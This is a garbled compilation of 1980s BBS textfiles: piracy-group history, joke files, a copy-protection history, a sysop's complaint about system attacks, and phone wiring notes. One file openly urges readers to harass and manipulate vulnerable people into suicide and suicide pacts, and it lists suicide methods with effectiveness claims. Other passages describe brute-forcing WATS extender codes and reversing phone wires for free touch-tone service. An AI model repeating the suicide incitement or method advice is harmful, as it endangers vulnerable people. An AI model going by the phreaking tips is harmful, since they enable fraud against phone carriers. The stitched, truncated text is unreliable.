The Sherwood Forest mentioned in that article was Magnetic Surfer's, not the later ones.  Sherwood forest was run on a micromodem and 1 disk drive. There were no Cat's, DOS was at 3.1, and Disk Drives were still a novelty. It went down in 1981 for whatever reasons, and went back up as a public system with 1200   a 46 mb hard drive in 1983. Shortly thereafter it went private and became the Knights of Shadow Base bbs.

Reading the list you have to keep in mind that this was right after the Inner Circle folded, and almost a year before LOD even began. So many of the current  Big Names , didn't even own computers yet.  In 1983 a friend of their's  The 212 718 people , called Creative Cracker put up a bbs called Sherwood Forest   . For a while it had an ae line simply known as  Sherwood Forest  in 201, then in 1984 Sherwood Forest  I  went up, run by High Technology. The original co sysops on SF    were High Tech   Jack The Ripper. Jack was dropped, High Tech became a full sysop, and the new co sysops became  Tuc, Bioc   Big Brother.  SF    started on a disk      a Rana  I  disk drive, Micromodem, and a clock. It went down for 2 weeks in 1984, then came back up with all new software, 20 megs and 1000's of files.  SF  I  went up with a disk      a Rana  I , and that's as big as it ever got. Creative Cracker was a full sysop. And the co sysops were Sharp Razor, X Man, and Wizard 414. co sub ops of maintenence  whatever that is , were  Sherlock Apple and Silicon Scorpion. All co sysops and sub ops were dropped after about 2 months.  None of the boards except for Magnetic Surfer's could be considered really impressive by todays standards. Impressive in terms of hardware that is. This is the time when just about the only hard drive was a corvus, whose prices for a 6 meg started at  2000 in that time. and a complete Apple Cat 212 card exp  ansion module system, came to over  1000.   And finally the Apple Mafia, was NEVER the  Micro Mafia , this was yet another group of losers cashing in on their group name.                                                                                   I could go on about what happens to all the people from SF, but that's not the purpose of this file, so I'm not going to digress. There are many files out  about many of the members  Lord Digital, Paul Muad'Dib, Mr. Xerox come to mind  already. And others have made themselves known through LOD as well  Lex . What this file is about is The Apple Mafia, so I'm not going to get into all that.  Which brings me to the final part. The Sherwood Forest Busts....  I'm saying right now that I don't know what happened, just offering the facts that I do know about it.  If  as is said , SF   was indeed run by the FBI towards the end. Then why did they let Creative Cracker keep cracking software  It doesn't seem likely they would have let him continue, did they just not know or what   Now if they weren't running SF  , then even more questions come to mind. The most important one is  why run a board if you truly don't care  CC never  looked at his board, never logged in, the news was updated once every 9 months by BIOC.   What's more, if it WAS a trap, then logically the other Apple Mafia members had to know about it. Or most of them. NONE of them EVER posted anything at all. With the exception of Silicon Scorpion   Sherlock Apple, who kept posting new wares.  It could be that they lost interest in piracy  As is true of Tuc, Lord Digital, The Phantom, Big Brother, in fact, almost all the members , BUT this still does not clear up why NONE of them EVER posted ANYWHERE, including the phreak boards or the elite subs. Now BIOC did post, but if you know BIOC, he always left some 500 line exerpt he typed up from some magazine, or manual  Which is actually just about all he ever did, much like Lex , nothing that could get him in any kind of trouble.  These are the same people whose msg's I've seen buffers of from Sherwood Forest  Magnetic Surfer's , and World of Cryton, who were posting techniques, systems, and information, all over. But not ONE msg. from any of them on their supposed  home base . Pretty weird....  The logical conclusion I draw from this is  They knew the board was being  watched at the very least, and didn't want to draw attention to themselves. In which case they left everyone else to get caught, which is in keeping with many of the peoples present attitudes. This is also the time during which the Apple Mafia members who were also in TKOS got a lot of heat from that group falling apart in a rather spectacular manner. With almost all of them in danger of being busted for grand theft.  While SF      I  didn't go down until summer of 1985, I would say the Apple Mafia died almost a year eairlier. I talked to Silicon Scorpion towards the end of 1984 and as he put it   What group  I don't even have anyones number anymore. How am I supposed to be part of a group whose members I can't even find   This refers to Creative Cracker whose voice number dissapeared, and who never answered his feedback, The Phantom, ditto. Big Brother, ditto. Tuc, ditto. Lord Digital, ditto   he stopped calling any boards. Data Dragon, he's never home. Who's that leave  not many.  In the cases of The Phantom, Lord Digital and Tuc, this is understandable. They were all undoubtedly living out paranoid fantasies of everything they'd ever done catching up with them, as it did with Mr. Xerox not too far in the past.  But what happened to everyone else                                                                                     The Apple Mafia is over. Maybe one day some of the members will regroup just for fun. It would be interesting. But some loser named Judge Dredd, should go crawl back where he came from. Or find another name for his lame excuse of a group.                                                                                   Here is the  flyer  heralding the regrouping of the Mafia in 1984. Verbatim as typed by The Godfather    BRIEF HISTORY OF THE APPLE MAFIA.  FOUNDED IN 1980 BY THE GODFATHER AS A JOKE.  REDONE IN 1981 AS A SEMI SERIOUS GROUP.  KICKED SOME ASS IN '82.  BLEW EVERYONE AWAY IN 83, AND WILL DO MUCH BETTER IN 84.  SINCE THE BEGINNING THE GROUP HAS DIED OUT AND BEEN REBORN SEVERAL TIMES, THIS TIME LETS KEEP IT GOING.  IS CURRENTLY THE OLDEST ACTIVE GROUP, NEXT  OF PEOPLE WHO WOULD STILL BE AROUND  ARE THE WARE LORDS  '83 I BEILIEVE  AND THE 1200 CLUB  '83 ALSO, I THINK .  THAT'S IT.  A FEW GENERAL IDEAS WE WISH TO PROMOTE   WHEN YOU GET SOME NEW SOFTWARE CALL UP AS MANY MAFIA MEMBERS AND GET IT TO THEM FIRST.  GET IT POSTED UP ON THE BOARDS AS FAST AS POSSIBLE, NOW WITH CATS, TIME IS CRUTIAL.  BE SURE TO STICK THE MAFIA AT THE END.  DON'T GET THE GROUP INTO FIGHTS, AND TRY NOT TO BE AN ASSHOLE.  IT HELPS TO GIVE OUT SOFTWARE TO OTHERS   WITH THE MOB BEHIND YOU, NO ONE  CAN STOP YOU.  KEEP IN TOUCH WITH OTHER MEMBERS, IT SUCKS WHEN YOU LOSE CONTACT, IF YOU NEED ANY HELP CATCHING UP, JUST ASK SOMEONE... THEY SHOULD BE WILLING TO HELP YOU CATCH UP.  NEW MEMBERSHIPS ARE DECEIDED BY ALL OF THE MEMBERS, IF YOU KNOW OF SOMEONE DECENT, TELL EVERYONE ELSE.  THATS ABOUT IT.  THE GODFATHER           1986.

Now this is all well and good, but the meaning of Boog has little, if any, to do with Lite Beer.  To solve this puzzle we must delve into a field entirely different from any we have previously encountered in our daily experience.  Look above you.  Can you see the sky or is your view impeded by the crinkly off white of an acoustic ceiling   The frosty neutral glare of a fluorescent lightbulb  Ceramic tile   Or perhaps, you can see the stars, staring back down from a height more remote than the sun.                   !        ! !     box.     !

A quick drive up to San Francisco to an art gallery  or a waffle factory, for that matt er  will verify the truth of this once and for all, and how this relates to Boog can be found hanging on the wall in the Smithsonian.       Zen is the art of perceiving the world as it is without trying nor even wanting to understand it.  Boog is the manifestation of this in the daily life of your average modem user.  Boog doesn't make sense, it doesn't have to.  All that is required is for you to perceive it.        As a minor footnote, of late there has been much confusion and hullaballoo concerning the spelling and proper punctuation of the word boog. Committees have met, polls have been taken, votes have been counted, decisions have been made, and the verdict is in  Capitalized.  0's as in B00G permitted only if G is capitalized. Lately the alternative form b00g has seemed to have gained some acclaim. Best used in the context  Boog  ,  Boog.  or  Boog! . Alas poor Boog, I knew him well..        Boog is a boog thing.  This sentence does not talk about itself, it does not concern itself with much of anything.  It is content to just be.   Little relevance is applied to the fact that I am not sticking to the subject matter. Lemmings need not stick to their subject matter  they are free to run off to god knows where to do god knows what to god knows which other  lemmings for god knows why and then  poof , he washes up onshore.  Sad, but the lemming did not seem to so think.  Similarly the frozen linguini becomes thawed hence rendering it edible, but not on a popsicle.  Until you understand this paragraph you are forbidden to continue.  I insist.       But what has this to do with Zen  Zen is neZ spelt backwards, but alas that gives little consolance. Were I to be a Maharishi ite, I would tell you how the Grand Forces of the Unified field combine to ..well.. let things happen. But I am not and I will not so you're out of luck. d00d.

The following is a list of K K00L DOOD characteristics.....   1  Anti sociality Ex They usually hang up when a sysop wants to chat   2  Buzzed hair From not coming in 10 years   3  Listens to Culture Club  4  Lies like a pig  5  Replaces  For  for  4  or  too,two or to  for  2  OR  f  for  ph  Ex PHUCK! PHUN!FONE!FREAKER   6  Can only type in UPPER CASE and 40 columns Because their Apple II  can't handle stuff like that   As you can see, this organism must lead a pathetic life. The following story is a dramatization of a K K00L DOOD   Hark! It is 1 38 A.M.! No one is moving in the Smith house. But wait! There is little Eggbert Smith tip toeing through the hallway! Why must the little fellow be alert at this time of night  For you see, Eggbert is a K K00L DOOD and it is his duty to call the local 10 meg Ae and leech every little ware he can get his little hands on! He puts a pillow over his computer so it won't make too much noise when it boots up. He enters the password!Acess at last! But what is this  The sysop goes onto chat mode and asks, Who is this   Little Eggbert  Who is SO nervous that he is jumping around the floor in his choo choo train P.J.s so he won't wet his pants  carefully types the name         Dr. Micro   Who ,in fact, is a famous software pirate. The sysop naturally disbelieves him and hangs him up.Poor little Eggbert! He has nothing to do but call his only friend  Irving . Naturally, Irving is awake because he too tried to leech off an ae and got kicked off. The obviously talk through the modem because they are too scared to talk to each other voice. Here is how their message went   HELLO  DR. IRVING  R U THAIR   HELLO  THE GRIM EGGBERT  IZ THAT U   YES! O AM EYE GLAD I FOUND U!!!1!!11111!11!!!!

Dr. Irving is blushing and giggling because he's never talked to a  Girl  before.  HYI....HYI...HI THERE...THIS IS DR. IRVING. I'M THE GRIM EGGBERT'S FRIEND    OH HI THERE!

THIS IS THE GRIM EGGBERT AGAIN I HAVE TO GO BYE  AE  CONNECTION TERMINATED     So little Eggbert goes back to bed. Worrying about the fears that lie ahead in life......another day.......another time....  The K K00L DOOD epidemic is swiftly plaguing the whole user world with these imbeciles. Symptoms of K K00L DOODNESS     1 You slowly have the urge to write in UPPER CASE.  2 You want to be a leech.  3 You have the tendency of waking up in the middle of the night  4  You want to be a K K00L DOOD!  If you think you are turning into a K K00L dude, go directly to your local Patriots of America and shout  No nukes!No nukes! Reagan is a Commie! Welfare! Liberality! Commies are really our friends!Love and Peace to all! Gays are people too! A.I.D.S. came from Reagan!Yay!  You will be immediatelly shot to death.  That concludes this edition of  The History of K K00L DOODS   If anyone out there wants to write a  The History of K K00L DOODS II  feel free to write it.Fuck! It's 2 39 A.M.! I think i'll call it a night.... Before I close up, I'd like to thank the Ascii Assassin for giving me the idea. Also, I'd like to thank lord Gypher for doing nothing at all.

"copyprot.pro",11392,11218,71.25,3.58,24.83,"nd.","nd.","nd.","textfile","  Author's Note   The following article was written for submission to ComputerFun magazine.  Alas, the mag died!  Some information, specifically that about pirates and piracy, is somewhat biased, due to the intended audience. Keep that in mind as you read this.  Still good for a laugh tho!   dt     COPY PROTECTION  A HISTORY AND OUTLOOK    Back in the last seventies, when personal computers were just starting to catch on, a lot of software was distributed on audio cassettes.  The price was generally low   15 and under , and so was the quality. Personal computer owners knew that audio cassettes could be duplicated fairly easily with two decent quality tape recorders. However, the process was time consuming and unreliable  volume levels were critical , and it did not save that much money, since the cassette alone cost five dollars anyway.  The market for cassette software was stable.    As the prices of home systems continued to drop, the popularity of the floppy disk as a storage medium increased so that software suppliers had to carry each program on both tape and disk. Typically, the disk version cost slightly more, due to the higher cost of the disk itself, and the fact that disk drive owners were prepared to pay a little extra for a program that loads several times faster.    These software prices, still relatively low, were short lived.  Disks, unlike tapes, were trivially easy to copy.  User clubs formed in which one copy was purchased  legally  and copied  illegally  for everyone in the group.  Worse yet, schools and businesses owning more than one system would make copies for all of their systems from one original.  Then, individuals connected with the schools or businesses would copy the disks for themselves, for friends, for their user club, for other schools and businesses...  Piracy had spread like a cancer to ridiculous proportions, throwing a monkey wrench into the once stable software market.    The software distributors' next move was to modify their program disks in such a way that they could not be duplicated by conventional means, and to raise their prices somewhat. These early efforts at copy protection were very simple, and equally simple to undo.  Every disk has on it a list of what data is contained on it, where on the disk it is, what type of data it is, etc.  The part of the disk that contains this information is called the catalog or directory of the disk. On copy protected disks, the catalog was altered slightly in format, moved to elsewhere on the disk, or omitted entirely.  All someone would have to do was restore the catalog, an easy task if you know what you're doing, and the disk would copy normally.    The new copy protected disks kept a significant proportion of the pirates discouraged, much the same way a flimsy doorknob lock  keeps an honest man honest .  Most of the early large scale piracy stopped.  Businesses and schools could not afford the time required to duplicate the disks, so they shrugged, gave in and bought the disks.  Hobbyists quickly found ways to copy the new software, but they were working independently, and therefore not dangerous.  The software industry was content and hopeful.    It was a false hope. As the popularity of personal computers continued to escalate, hobby users banded together more and more.  Some broke the software  lock  and made the disks copyable while others purchased the tape versions of software and transferred them to disk. The industry retaliated by discontinuing most of the taped versions of software, as they were far too easy to copy, and by using more sophisticated techniques to protect the disks.  Of course, they also raised the prices.    These second generation copy protection schemes worked remarkably well for a while. Data on a disk is encoded  pre nibbilized  in a standard way before it is written out to disk, and then decoded  post nibbilized  as it is read back. By altering the code under which the data is written and read, the software companies rendered ordinary copy programs useless.  Another technique of this era was to write data in unusual formats in odd places on the disk, such as between two tracks or after the last track normally used.    The hobby users, indignant at the recent price increase, adapted the general attitude that piracy is okay because they would never buy the software at the exhorbitant price being asked. User clubs were now considered essential.  To not belong to one was to be repeatedly  cheated  when buying software.  No matter what copy protection methods the software people tried, the pirates broke the disk and circulated the copy, quite literally around the country.    In order to make piracy easier, enthusiasts and certain software firms  considered traitors by other software firms  developed special copy programs which analyzed the data being copied as little as possible, attempting to copy as directly as is possible from one disk to another.  The infamous Locksmith and the more recent COPY    are examples of such programs, called bit copiers or nibble copiers because they copy the data one bit or one nibble at a time, rather than one sector or one track at a time.    Still, the goal of a pirate was downright unprotection, not duplication.  To a new breed of pirate, it was a game.  Each new disk provided the pirate with a new challenge, a puzzle, which, if he could solve, would make him famous  pirates tended to leave their mark on the disks they unprotected in those days . To the software firms, it was hardly a game, it was a war of attrition, and until they could outsmart the pirates, they would just have to increase the prices and hope for the best.    Or would they   Some software companies stepped back at this point and surveyed the situation   they probably could not keep the pirates at bay for long, as there was genuine intelligence out there    thousands of users all working toward one goal    to break that disk! It seemed to them that they actually had a number of options if they wished to continue to do a healthy business.  First, they lobbied for stricter copyright laws and won.  Bootleg disk distribution is now more illegal than every before, but it is still difficult to enforce the law.  Second, they could fight it out, raising the prices as necessary and developing more diabolical methods of copy protection.    Only so much can be done to protect disks, however.  Those firms that continued to protect their disks were upset by the introduction of a hardware device developed by pirates and later marketed which allows the entire state of the computer to be frozen and remembered, down to the last status bit, and restored at will later.  Duplication of the program disk was no longer necessary.  The whole program was right there in memory waiting to be run.  All the pirate had to do was duplicate the state the computer was in, not the disk that got it there.    The software firms, to work around the setback, tried a new technique   they caused their programs to look at the disk periodically and make sure it is the original.  How to tell the difference between the original and a copy was an ingenious trick called nibble counting.  When disks are copied, the two drives doing the copying are seldom running at the exact same speed, so the duplicate disk will contain tracks which are slightly longer  more nibbles  or shorter  fewer nibbles  than the original.  The software could count the nibbles and determine whether the disk being used is an original.  Soon, though, nibble copiers began to allow the user to preserve the nibble count, foiling the protectors again.    Another particularly devious tactic in copy protection is called sector skewing.  To simplify a complex process, data is spread finely over the entire disk, so that it would take an exceptionally high quality disk drive to write such a disk, though any drive can read it under direction of the software.  What these software firms realize too late is that the pirates have one secret weapon    a foolproof, though painful, procedure to break any disk protection scheme    boot tracing!  You see, software has the unfortunate characteristic that it has to be written in such a way that the computer can understand it.  It has to, so to speak, spoon feed itself to the computer.  The process of boot tracing is simply to painstakingly, step by step, pretend you're the computer, follow all the rules it follows, and you will eventually succeed in reading the disk.    Some software firms still fight the war of attrition, such as Br0derbund, On line systems and others.  Other firms had a better idea   to give up on protection altogether and direct their attention to providing an attractive package    with ample documentation, quick reference cards and other goodies    at a good price.  An excellent example of this novel approach, to give the buyer a good deal, is Beagle Bros, whose software has never been protected, and never will be.  Their products are of highest quality and reasonably priced. To be sure, it is duplicated to some degree, but the package with all its goodies is worth the investment.  Penguin software has used this approach successully as well.    A final possibility, useful only in the more expensive packages, is to require a hardware device to be installed in the computer for the software to run properly.  Softerm 2 for Apple, for instance, requires a plug in card to be installed in the computer which has attached to it three special function switches necessary for the operation of the program.  You can copy the disk, but not the card.  Not all computers have as much room for extra hardware as the Apple, though, and hardware devices cost a lot of money compared to disks and manuals, so this method is only practical in expensive packages.    So where does all that leave you, the honest  ahem!  consumer   Well, the software firms really are anxious to serve you.  If your copy protected disk ever fails to work, you can send it back for free replacement. If the disk is damaged physically, the replacement fee is about five dollars  provided you send in the old disk!! .  Many packages come with two copies of the software, in case one should fail, and legitimate software owners often receive free updates to both the software and the documentation.  Software companies try to make it worth your while to buy their product. Also, due to a recent crackdown, big time pirates are getting caught, and piracy is more anonymous now. Trust among pirates has broken down, and so has the once widespread circulation of pirated disks. The heyday of piracy is over.  So, if you are thinking of getting some software, examine the package.  Find out exactly what the program can do, the guarantee, and all the fringe benefits you will receive as a legitimate owner of the software.  If, after all that, the package does not interest you, don't buy it.  If you are considering being a pirate, be careful! Imprisonment is entirely possible if you are caught, and even if you are not, you are only raising software prices for yourself and everyone else.     DT    if you are caught, and even if you are not, you are only raising software prices for yourself"

John Draper, one of Apple's first employees, was responsible for designing a telephone board for us.  Much more than a modem, the board could send touch tone or pulse dial data  it could also transmit any tones that were programmable down the line, listen for specific sounds, and a bunch of other things.     At one point Draper was motivated to crack WATS extenders.  A WATS extender is used when a company has incoming and outgoing free 800 lines.  Company executives call in on the incoming 800 line and tap out a four digit code, which gets them on their company's outgoing 800 line.  They only system protection is the four digit code.     It would take a long time to dial 10,000 phone calls manually, searching for the extender code.  But Draper had designed this new telephone board, and he knew a bunch of companies that had WATS extenders.  He programmed the Apple to call the company on its 800 number, automatically get to the WATS extender, type out a four digit code, and check to see if the attempt succeeded or failed.  The Apple with the board would listen to all the tones on the phone line to determine when it was ringing, when it went to the WATS extender, and so on.     It took about 10 seconds for the Apple to dial the call and try a new four digit code.  The Apple would restart and try again.  And then try the next number.  It was able to dial about 5,000 calls a night    the average number of calls to crack a WATS extender.  Draper cracked about 20 WATS exteders, averaging one a night.     The city of Mountain View, California, where he lived at the time, keeps an index of how well the phone system is working.  An average of 30  of all calls made from the city don't go through.  The month Draper was cracking the WATS extenders, the index jumped to 80 !  For that month Draper made more than 50  of the calls originating from Mountain View, California, whose population is 60,000....

Being a Senior fuckin cranks...  Party when ever you want, get laid by fresmen and sophmores, its just generally fucking great...   Well, latX2  !Jee has 9many Suicides lately.  A little while ago, here in beautiful NJ, 4 teenagers said their last rites and started the car up in the garage.  This brought a smile to my face, you see, the more people dead, the better off you are in the game of life.   When people our age die, that means the rest of us have a better chance of getting into the college we want, cause there is less of them to compeate with.  There are more jobs to have, and maybe you might find one you like.   There is more food and other material products, and this keeps the price of everything down.  Its just better for the whole society.   Who cares about the mourning family, they'll get over it, as you know who says  another day, another death ...   Death is a fact of life for everyone, and the more dead, the better.    HOW YOU CAN HELP                      Find somebody that looks  as follows  like this    Real Ugly, someone who needs to be put out of misery, and so we don't have to             look at them   Real Quiet, these people usally have something wrong upstairs, they can't deal              with other people, they are no good to you anyway.   Real Stupid, everybody knows someone like this, like IQ of 98, someone who can               be pursuaded easily into the act.   Someone with parents that prod them, like high pressure parents, who tell           thier kids to do well in everything or die...   this is the good one    Somebody who has tried committing suicide before, cause they are fucked up            allready and they are the easist to convince.    CONVINCING THEM                    Ok, find one of the above and try the first tactic, total harassment.  Just rag and rag and rag and rag on them, tell them their mother sucks black cock in hell, send letters saying that they are illegitimate, saying that they are  drafted into the Marines..  Call them up and tell her mom that she does Crack and she's pregnant.  Get a guy that looks like a total scumbag biker with chains and shit and tell her mom that he's ready to pick her up  for their orgy.   Or if its a guy tell him 'yo maun, i got de stuff, wheres de  money   ... Just make their total life hell.  OR  Befriend them, get real close to them, tell them you love them, you want to be with them forever  in hell .  Get close to the parents to, act real nice, kiss some ass, be a real goody 2 shoes, feel like part of the family. Then make up some crisis you supposedly had at home, say that your dad is gonna kick you outa the house if  you dont cut that hair ...sorry...                                   you dont get a job and pay for everything you use.  Say that he grounded your for 5732 days and you can't go anywhere. Then lie to the other kid's parents and tell them something like your  son  daughter's is hooked on drugs and get her in trouble.  Then at night tell the other party to meet you somewhere, like on a bridge, anywhere that you can die easily.  Then make her feel like shit and ask  demand  her to go in a suicide jump together, go 1 2 3, she jumps you stay where you are and laugh.   PACTS          Suicide Pacts are the best way to get rid of alot of people at once.  Pacts  usally consist of 2 to 6 people,  unlike my good friend Jim Jones who wiped out over 300 with poisoned Kool Aid , and are usally done in a painless way. Try to find a bunch of depressed people and tell them to join your little group that meets twice a week to 'talk' about everyones problems. Bullshit with them for a week or two, show a few other ways out of depression  which should'nt work  then tell them  strongly  about a easy way out, convince them into a SUICIDE PACT.  Probability is that if 2 or 3 agree with it, the whole group will do it, and that's just dandy!.   PRE ACT TACTICS                    Now since this person is never going to be around any more, and if you say you are going with them, tell the other party to give you all their belongings so you can 'give it to charity, someone who really needs it'.  Of course all the goods go to bank account and some good blow.  Also, if you play your cards right, you can take out a life insurance policy on the person and make 10g's to 1 mil, depending on the company and how stupid they are.  Or if you forgot about the pre act tactics just go to the parents and say 'She would want me to have this'  a  2500 pioneer stereo rack system , a few weeks after the death, and cry when you do it.   WAYS OF SUICIDE                    The folling is a list of many ways to get the person to commit suicide    Carbon Monoxide, as in automobile exhaust, a very painless way to die.  You just sit in the car, in a garage, and it feels like you are going to sleep.    A Gun, also another painless way, point the gun at the temple  head , aim on an angle towards the lower base of the skull, instant DEATH.    Slitting of the Wrists, very stupid, painful at first, but eventually you go  into shock.  This way of suicide has the highest failure rate due to people chickening out, it lasts from 20 mins. to sometimes 3 hrs. not a good way.    Jumping off a tall building, a good way, because  50 of the people that jump DIE of fright before hitting the ground.  Somewhat tramatic for the 4 seconds you are in the air, but more or less, a good way.    Jumping in front of a Bus, Train, or any Large vehicle, a  75 percent success rate as long as your head hits againt the oncoming force quickly.  People have been mangled and lived through it, and you don't want that to happen, you want to DIE REMEMBER      Overdose of Drugs, a somewhat lame way to go depending on the drug... also you need to take the right amount due to if you take too much, you will just throw it up and suffer for 24 hrs... not to much, not to little, you can  determine by the recomened doseage.  Sleeping pills are probably the most  painless, you just pass out.  Overdoses of drugs such as Acid,LSD,and other phyco drug is another stupid way to go, and if you live through it you are a vegetable for the rest of your fucking life.     Drowning  A bad way to go, due to suffication people who have lived through a near drowing say  It fucking sucks  to put it in laymens terms, not suggested.   Hanging  good if you do it right.  In the old west they used a more or less 'painless' way of hanging.  When they released the lever, your neck broke and usally you couldnt feel anything anyway, and before you knew it, you we DEAD. A relitivly good and graphic way to go.   Running your car off a cliff  Very stupid unless you have a high cliff or mountain.  People usally try to pull out at the last second, and end up paralized for life.  Not recommended.   Electricution  Not bad, as long you have a good current.  Go to your local  power substation and ground yourself to something, and as soon as you touch the ends of those big semi condutors, you're history.    Poison  Same as drugs.   Stabbing yourself  Usally reserved for Sickos, a very painful way to die, and you watch yourself bleed to death.  Pretty beat way to go.   Drinking yourself to Death Sounds fun, should try it sometime....but seriously, probably not a bad way to go, get wasted, and die!  Get grain alcohol,  199 proof, good shit.   Well, im probably missing like hundreds of more ways, but this file is just to get you started in the game of life.

I have utilized this to the distinct advantage of the operator of the Urine box and to the disadvantage of the other party involved, hopefully you won't get caught.   Without further ado, wire this schematic together. Copper wire  or gold  will work best due to its lessened resistance.

DURING THE PAST EIGHT YEARS, I HAVE BEEN HEAVILY INVOLVED WITH  BULLETIN BOARD  SYSTEMS RUNNING ON MICROS AND MAINFRAMES.

THIS SOFTWARE RAN FOR 3.5 YEARS WITHOUT A PROBLEM.  BUT NOW, AS MORE AND MORE POTENTIAL CRACKERS HAVE ACCESS TO COMMUNICATIONS EQUIPMENT, THIS SYSTEM HAS BEEN CRASHED REPEATEDLY.

I RUN MY OWN SYSTEM AND PUBLISH SOFTWARE THAT TURNS A TRS 80 INTO A MAIL AND MESSAGE SYSTEM.  I HAVE SAT AND WATCHED CALLERS SYSTEMATICALLY ATTACK THE SYSTEM.  THIS TAKES SEVERAL FORMS   1  ALL COMMANDS, SERIES OF COMMANDS, AND OPTIONS ARE TRIED.  2  THE SYSTEM IS ASSAULTED WITH ALL MANNERS OF CONTROL SEQUENCES, TRYING TO GET SOME UNEXPECTED RESULT.  3  I HAVE EVEN SEEM SOMEONE DROP AND THEN RE INITIATE CARRIER TO SEE IF THEY COULD GET SOMEWHERE.    IF THAT DOESN'T WORK, THEY BEGIN TO CRACK PASSWORDS.  THEY KNOW WHAT THEY ARE DOING...  IN ONE CASE, I WATCHED AS SOMEONE WENT THROUGH WHAT LOOKED LIKE THE BEGINNING OF THE WEBSTER'S DICTIONARY TRYING TO GET SUPERUSER STATUS.  SINCE MOST PEOPLE USE WORDS, NOT A BAD IDEA, RIGHT   LESS INTELLIGENT ONES START WITH A AND JUST TRY AND TRY AND TRY.  OH, BY THE WAY, THEY ARE DEFINITELY USING AUTO DIAL MODEMS AND SOFTWARE TO DO THIS.    IF ALL ELSE FAILS, THEY SIMPLY TIE UP THE SYSTEM.  THEY CHOOSE THE MOST OBVIOUSLY DISK INTENSIVE COMMAND, AND EXECUTE IT AGAIN AND AGAIN.  SINCE MANY SYSTEMS ONLY TIMEOUT AFTER INACTIVITY, THIS COULD TIE UP THE SYSTEM FOR MANY HOURS  NOT TO MENTION THE WEAR AND TEAR ON THE EQUIPMENT .  THESE LITTLE BASTARDS CERTAINLY AREN'T DOING ANYTHING CONSTRUCTIVE.    SEVEN YEARS AGO, I CALLED UP MIT MC AND GOT A TOURIST ACCOUNT WHICH I KEPT FOR THREE YEARS UNTIL I GOT AN AUTHORIZED ONE. IT WAS A FREE ACCOUNT ON AN OPEN SYSTEM  THE ONLY STRINGS WERE THAT I USE IT AFTER HOURS AND NOT TIE UP TOO MANY RESOURCES.  BUT THINGS HAVE CHANGED.  YOU CAN'T HAVE TOTALLY OPEN SYSTEMS ANYMORE WITHOUT MANY PRECAUTIONS AND ALMOST CONSTANT SUPERVISION.  FOR EXAMPLE, I HAVE HAD TO ADD MANY SECURITY FEATURES TO THESE SMALL SYSTEMS   1  THREE ATTEMPTS AND YOU LOSE THE CONNECTION. NINE ILLEGAL ATTEMPTS AT A USERNAME WITHOUT A CORRECT LOGIN CAUSES A SUSPENSION . ANYONE TRYING TO LOGIN UNDER THAT NAME IS IMMEDIATELY SUSPENDED  WITH SOME EXCEPTIONS .  2  CONNECTION LIMITED USE.  3  APPLICATION PROCESS REVIEWED BY SYSOP BEFORE SOMEONE CAN USE ALL FEATURES, OR EVEN USE THE SYSTEM.  4  ISOLATE THE USER COMPLETELY FROM ALL OPERATING SYSTEM FUNCTIONS, EVEN TO THE POINT OF MODIFYING THE DOS TO HANG OR RESET WHEN NECESSARY.    I DO HAVE ONE LITTLE  JOKE  UP MY SLEEVE.  THERE IS AN ACCOUNT ON THESE SYSTEMS CALLED SYSOP.  NOW, IF I WAS GOING TO BREAK IN, THAT IS WHERE I WOULD START. I'VE PUT A LITTLE PATCH INTO MY HOST.  AFTER 39 INCORRECT TRIES ON THAT ACCOUNT, IT ALLOWS THE CALLER THROUGH. HE GETS A WELCOME MESSAGE AND SYSOP COMMAND .  HE CAN RENUMBER MESSAGES, CHANGE THE DATE AND TIME, EVEN DELETE FROM THE DIRECTORY, CHANGE USERNAMES AND PASSWORDS. HE CAN DO ALL THE THINGS THAT A SYSOP CAN DO.  OF COURSE, HE ISN'T  REALLY  DOING ANYTHING  HE HE HE!  AFTER, OH SAY, 10 MINUTES, OUTPUT STOPS.  24 LINEFEEDS ARE ISSUED AND THE FOLLOWING APPEARS  SLOWLY, AS IF FROM A TTY        HELLO INTRUDER!  GEE, I WANT TO THANK YOU FOR HANGING AROUND FOR     THE PAST TEN MINUTES WHILE WE HAD A CHANCE TO TRACE YOUR CALL.  IT     IS TOO BAD THAT SOME PEOPLE JUST CAN'T LIVE RESPONSIBLY.  BUT, I     GUESS THAT IS THE REASON WE HAVE THE POLICE AND FBI, RIGHT       DISCONNECT     I DON'T KNOW WHAT THE ANSWER IS, BUT I DO KNOWS THAT TREATING THIS TYPE OF BEHAVIOR CASUALLY MUST BE STOPPED.  THERE WILL ALWAYS BE PEOPLE WHO WILL TRY TO CIRCUMVENT ALL SECURITY MEASURES, SOMETIMES OUT OF CURIOUSITY, BUT RECENTLY MORE OFTEN WITH THE INTENTION OF DOING SOMETHING DESTRUCTIVE.    IT'S TOO BAD THAT THE DAYS OF THE UNSECURED SYSTEMS IS COMING TO A CLOSE, BUT WITH HUNDREDS OF PEOPLE SCANNING THE EXCHANGES WITH THEIR AUTO DIAL MODEMS LOOKING FOR CARRIERS, ARMED WITH 10 PAGES OF PIRATED MCI ACCESS CODES, WE DON'T HAVE MUCH CHOICE.

Part V will deal with telephone electronics focusing primarily on the subscriber's telephone.  Hereinafter simply referred to as  fone.   Wiring           Assuming a standard one line fone, there are usually 4 wires that lead out of the fone set.  These are standardly colored red, green, yellow,   black.  The red   green wires are the two that are actually hooked up to your CO.  The yellow wire is sometimes used to ring different fones on a party line  ie, one  , several families  found primarily in rural areas where they pay less for the service and they don't use the fone as much   otherwise, the yellow is usually just ignored. On some two line fones, the red   green wires are used for the first fone   and the yellow   black are used for the second line.  In this case there must be an internal or external device that switches between the two lines and provides a hold function.  Such as Radio Shack's outrageously priced 2 line   hold module .  In telephony, the green   red wires are often referred to as tip  T    ring  R , respectively.  The tip is the more positive of the two wires.  This naming goes back to the old operator cord boards where one of the wires was the tip of the plug and the other was the ring  of the barrel .  A rotary fone  aka dial or pulse  will work fine regardless of whether the red  or green  wire is connected the tip    or ring   .  A touch tone  TM  fone is a different story, though.  It will not work except if the tip    is the green wire.  Although, some of the more expensive DTMF fones do have a bridge rectifier which compensates for polarity reversal.   This is why under certain  non digital  switching equipment you can reverse the red   green wires on a touch tone fone and receive free DTMF service.  Even though it won't break dial tone, reversing the wires on a rotary line on a digital switch will cause the tones to be generarted.  Voltages, Etc.                 When your telephone is on hook  ie, hung up  there is approximately 48 volts of DC potential across the tip   ring.  When the handset of a fone is lifted a few switches close which cause a loop to be connected  known as the  local loop   between your fone   the CO.  Once this happens DC current is able to flow through the fone with less resistance. This causes a relay to energize which causes other CO equipment to realize that you want service.  Eventually, you should end up with a dial tone.  This also causes the 48 VDC to drop down into the vicinity of 12 volts.  The resistance of the loop also drops below the 2500 ohm level, though FCC licensed telephone equipment must have an off hook impedance of 600 ohms. As of now, you ahands of our  friends  